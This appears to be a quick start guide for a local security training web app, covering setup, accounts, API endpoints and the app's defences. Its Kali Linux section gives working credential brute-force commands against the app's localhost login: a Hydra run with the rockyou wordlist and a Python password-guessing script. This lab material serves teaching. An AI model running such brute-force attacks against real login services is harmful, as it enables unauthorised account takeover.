# Quick Start Guide

## Setup (5 minutes)

### 1. Install Dependencies
```bash
npm install
```

### 2. Initialize Database
```bash
npm run init-db
```

### 3. Start Server
```bash
npm start
```

Visit: **http://localhost:3000**

---

## First Steps

### Create Your Account
1. Click "Get Started" or "Register"
2. Enter your details:
   - Name: Your Full Name
   - Email: your@email.com
   - Password: Min. 8 characters

### Login
1. Click "Sign In"
2. Use your credentials
3. **Note**: 5 failed attempts = 5-minute lockout

### Start Training
1. Browse available simulations
2. Click on any simulation
3. Read the details
4. Click "Start Simulation"

---

## For Kali Linux Users

### Quick Attack Test

1. **Create a test user** (from the web interface)
   - Email: test@example.com
   - Password: Test123!

2. **From Kali Terminal**:

```bash
# Method 1: Using the provided script
./kali-attacks.sh

# Method 2: Manual Hydra attack
hydra -l test@example.com -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form \
  "/api/login:email=^USER^&password=^PASS^:Invalid" \
  -V -f -t 4

# Method 3: Python script
python3 << 'EOF'
import requests
passwords = ["password", "Test123!", "admin123"]
for pwd in passwords:
    r = requests.post("http://localhost:3000/api/login",
                     json={"email": "test@example.com", "password": pwd})
    print(f"{pwd}: {r.status_code}")
    if r.status_code == 200:
        print(f"SUCCESS: {r.json()['token'][:50]}...")
        break
EOF
```

---

## Monitoring Your Attacks

### View Attack Logs
1. Login to dashboard
2. Click "Attack Logs" tab
3. See all attempts with:
   - Timestamp
   - IP address
   - Success/Failure
   - Details

### Check Results
1. Click "My Results" tab
2. View:
   - Completed simulations
   - Scores
   - Duration
   - Status

---

## Common Issues

### Database Error
```bash
# Reinitialize database
npm run init-db
```

### Port Already in Use
```bash
# Change port in .env file
PORT=3001
```

### Can't Connect from Kali
```bash
# If server is on different machine
# Update TARGET_IP in kali-attacks.sh
TARGET_IP="192.168.1.100"
```

---

## Security Features in Action

### Rate Limiting
- 20 requests per 15 minutes per IP
- Exceeding = temporary block

### Account Lockout
- 5 failed login attempts
- 5-minute lockout period
- All attempts logged

### Token Expiration
- JWT tokens expire in 24 hours
- Automatic logout on expiry

---

## API Endpoints

### Public
- `POST /api/register` - Create account
- `POST /api/login` - Authenticate

### Protected (Requires JWT)
- `GET /api/user-profile` - User info
- `GET /api/simulations` - List simulations
- `POST /api/simulations/:id/start` - Start simulation
- `GET /api/results` - User results
- `GET /api/attack-logs` - Attack history
- `GET /api/dashboard/stats` - Statistics

---

## Tips for Learning

1. **Start Simple**: Try brute force with a short password list
2. **Monitor Logs**: Watch how your attacks appear in logs
3. **Test Defenses**: Try to bypass rate limiting
4. **Experiment**: Modify attack scripts and observe results
5. **Document**: Keep notes on what works and what doesn't

---

## Next Steps

- [ ] Complete all 8 simulations
- [ ] Try different attack tools (Metasploit, Burp Suite)
- [ ] Analyze attack logs
- [ ] Improve your scores
- [ ] Learn defensive techniques

---

## Need Help?

1. Check README.md for detailed docs
2. Review server logs in terminal
3. Check browser console (F12)
4. Ensure all dependencies installed

---

**Remember**: Always hack ethically and legally! 🔐
